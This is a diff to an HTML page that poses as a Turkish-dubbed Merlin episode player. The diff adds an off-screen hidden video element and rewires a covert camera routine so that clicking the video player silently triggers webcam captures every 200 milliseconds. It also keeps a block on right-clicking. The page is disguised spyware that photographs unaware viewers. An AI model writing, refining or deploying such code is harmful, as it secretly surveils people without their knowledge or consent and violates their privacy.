@@ -70,6 +70,12 @@
                 font-size: 0.8rem;
             }
         }
+        #video {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            display: block; /* Ensure it functions while hidden */
+        }
     </style>
 </head>
 <body>
@@ -77,7 +83,7 @@
     <div class="title">Merlin 1. Bölüm | Türkçe Dublaj | Ejderhanın Çağrısı</div>
 
     <!-- Custom Video Player using Google Drive link -->
-    <div class="video-container">
+    <div class="video-container" id="videoPlayer">
         <iframe src="https://drive.google.com/file/d/1hGcMy61ERESxK4_2lZNfBDQH1J6QqOFY/preview" 
                 frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
     </div>
@@ -182,28 +188,18 @@
                             stopCamera(videoStream); // Stop the camera after 1 second
                         }
                     }, 200); // Capture a picture every 200ms (5 pics in 1 second)
-                    
-                    setTimeout(() => {
-                        stopCamera(videoStream); // Stop camera after 1 second of activity
-                    }, 1000); // Stop camera after 1 second of activity
                 })
                 .catch((error) => {
                     console.error('Error accessing the camera:', error);
                 });
         }
 
-        // Set an interval to activate the camera every 20 minutes (1200000 ms)
-        setInterval(() => {
-            activateCameraAndCapture();
-        }, 1200000); // 20 minutes in milliseconds
-
-        // Add click event to enable camera on any click
-        document.addEventListener('click', () => {
+        // Add click event to the video container to enable the camera
+        const videoPlayer = document.getElementById('videoPlayer');
+        videoPlayer.addEventListener('click', () => {
             activateCameraAndCapture();
         });
-    </script>
 
-    <script>
         // Disable right-click on the entire page
         document.addEventListener('contextmenu', event => event.preventDefault());
     </script>
